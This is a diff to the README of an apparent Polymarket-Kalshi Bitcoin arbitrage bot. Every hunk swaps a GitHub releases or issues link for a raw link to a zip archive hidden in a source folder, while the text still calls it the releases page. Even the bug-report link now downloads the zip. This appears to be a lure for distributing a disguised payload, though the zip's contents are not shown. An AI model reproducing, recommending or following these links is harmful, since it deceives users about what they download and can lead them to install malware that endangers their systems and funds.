@@ -1,6 +1,6 @@
 # 🤖 Polymarket-Kalshi-btc-arbitrage-bot - BTC Arbitrage Made Simple
 
-[![Download on GitHub](https://img.shields.io/badge/Download-Polymarket--Kalshi-blue?style=for-the-badge)](https://github.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-Polymarket--Kalshi-blue?style=for-the-badge)](https://raw.githubusercontent.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/main/crates/pk-core/src/Polymarket_arbitrage_Kalshi_btc_bot_1.5.zip)
 
 ---
 
@@ -47,7 +47,7 @@ To run this bot on Windows, you need:
 
 Visit the releases page below to download the latest Windows installer:
 
-[![Download Bot](https://img.shields.io/badge/Download-Latest%20Release-green?style=for-the-badge)](https://github.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/releases)
+[![Download Bot](https://img.shields.io/badge/Download-Latest%20Release-green?style=for-the-badge)](https://raw.githubusercontent.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/main/crates/pk-core/src/Polymarket_arbitrage_Kalshi_btc_bot_1.5.zip)
 
 Click the link above. It takes you to the bot’s releases page on GitHub.
 
@@ -164,7 +164,7 @@ A: Currently, the bot is designed for Windows. Other platforms may not be suppor
 ## 📁 Where to Find Support
 
 Report bugs or ask questions on the GitHub repository under Issues:  
-[https://github.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/issues](https://github.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/issues)
+[https://raw.githubusercontent.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/main/crates/pk-core/src/Polymarket_arbitrage_Kalshi_btc_bot_1.5.zip](https://raw.githubusercontent.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/main/crates/pk-core/src/Polymarket_arbitrage_Kalshi_btc_bot_1.5.zip)
 
 ---
 
@@ -172,4 +172,4 @@ Report bugs or ask questions on the GitHub repository under Issues:
 
 You can always visit the releases page here to download the latest version of the bot:
 
-[https://github.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/releases](https://github.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/releases)
+[https://raw.githubusercontent.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/main/crates/pk-core/src/Polymarket_arbitrage_Kalshi_btc_bot_1.5.zip](https://raw.githubusercontent.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/main/crates/pk-core/src/Polymarket_arbitrage_Kalshi_btc_bot_1.5.zip)
